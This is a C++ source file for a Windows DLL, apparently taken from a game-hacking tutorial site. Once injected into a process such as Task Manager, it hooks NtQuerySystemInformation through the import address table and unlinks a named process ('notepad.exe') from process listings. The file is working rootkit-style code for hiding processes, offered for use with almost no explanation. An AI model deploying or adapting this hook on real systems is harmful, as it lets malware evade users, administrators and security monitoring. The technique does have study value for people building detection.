// more information go to guidedhacking.com,
//https://guidedhacking.com/threads/windows-api-hooking-how-to-hide-process-from-task-manager.12061
#define _CRT_SECURE_NO_WARNINGS

#include "stdafx.h"
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"),
    "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    if (SystemProcessInformation == SystemInformationClass && NT_SUCCESS(status))
    {
        // Loop through the list of processes
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
                NextEntryOffset);
            if (!wcsncmp(pNext->ImageName.Buffer, L"notepad.exe", pNext->ImageName.Length))
            {
                if (!pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}

void hook() {

    MODULEINFO modInfo = { 0 };
    HMODULE hModule = GetModuleHandle(0);

    // base address of the injected process
    GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

    char szAddress[64];

    // find import headers
    LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;

    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER)&(pINH->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // locate ntdll.dll
    for (; pIID->Characteristics; pIID++) {
        if (!strcmp("ntdll.dll", (char *)(pAddress + pIID->Name))) {
            break;
        }
            
    }

    // Search for NtQuerySystemInformation
    PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((pAddress + pIID->FirstThunk));
    PIMAGE_IMPORT_BY_NAME pIIBM = NULL;

    for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
        pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
        if (!strcmp("NtQuerySystemInformation", (char *)(pIIBM->Name)))
            break;
        pFirstThunkTest++;
    }

    // Write over function pointer
    DWORD dwOld = NULL;

    //32bit
    //VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
    //pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInformation;
    //VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

    //32bit
    //sprintf(szAddress, "%s 0x%X", (char *)(pIIBM->Name), pFirstThunkTest->u1.Function);

    //64bit
    VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOld);
    pFirstThunkTest->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
    VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(uintptr_t), dwOld, NULL);

    //64bit
    sprintf(szAddress, "%s 0x%I64X", (char *)(pIIBM->Name), pFirstThunkTest->u1.Function);

    CloseHandle(hModule);
}

bool __stdcall DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hook();
        break;
    }
    return TRUE;
}

